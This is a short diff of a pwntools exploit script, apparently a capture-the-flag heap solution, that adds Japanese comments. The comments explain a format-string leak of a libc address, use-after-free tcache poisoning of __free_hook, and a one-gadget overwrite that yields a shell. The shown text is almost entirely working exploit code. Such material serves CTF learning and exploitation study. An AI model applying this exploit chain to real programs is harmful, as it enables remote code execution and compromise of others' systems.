@@ -54,6 +54,7 @@ def release(index: int):
 off_start_main = libc.symbols["__libc_start_main"] + 231
 catch(0)
 naming(0, '%11$p')
+# ここでFSBを使用して__libc_start_main + 231のアドレスをリーク
 show(0)
 leak = eval(p.recvline(14))
 log.info("leak: 0x{:08x}".format(leak))
@@ -65,10 +66,14 @@ release(0)
 off_one_gadget = 0x4f432
 free_hook = libc_base + libc.sym['__free_hook']
 log.info("free_hook: 0x{:08x}".format(free_hook))
+# 解法済みのindex 0でUseAfterFreeを使用し、nextポインタを__free_hookに向かせる
 naming(0, p64(libc_base + libc.sym['__free_hook']))
+# ここで得られるのはtcacheに格納されたindex 0
 catch(1)
+# これで__free_hookが返ってくるので、One-Gadget RCEに書き換え
 catch(2)
 naming(2, p64(libc_base + off_one_gadget))
+# One-Gadget 発火
 release(1)
 
 p.interactive()
